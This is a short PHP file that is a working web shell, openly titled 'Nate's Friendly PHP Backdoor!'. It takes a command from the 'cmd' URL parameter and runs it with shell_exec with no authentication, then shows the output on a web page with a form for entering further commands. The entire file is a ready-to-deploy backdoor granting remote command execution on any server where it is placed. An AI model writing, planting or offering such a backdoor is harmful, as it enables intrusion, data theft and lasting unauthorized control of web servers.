<?php
// Get the command from the URL parameter
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';

// Execute the command and capture the output
$output = '';
if (!empty($cmd)) {
    $output = shell_exec($cmd);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Nate's Backdoor</title>
</head>
<body>

<h1>Nate's Friendly PHP Backdoor!</h1>

<form method="get" action="">
    <label for="cmd">Enter Command:</label>
    <input type="text" name="cmd" id="cmd" value="<?php echo htmlspecialchars($cmd); ?>">
    <input type="submit" value="Execute">
</form>

<?php if (!empty($output)): ?>
    <h2>Command Output:</h2>
    <pre><?php echo htmlspecialchars($output); ?></pre>
<?php endif; ?>

</body>
</html>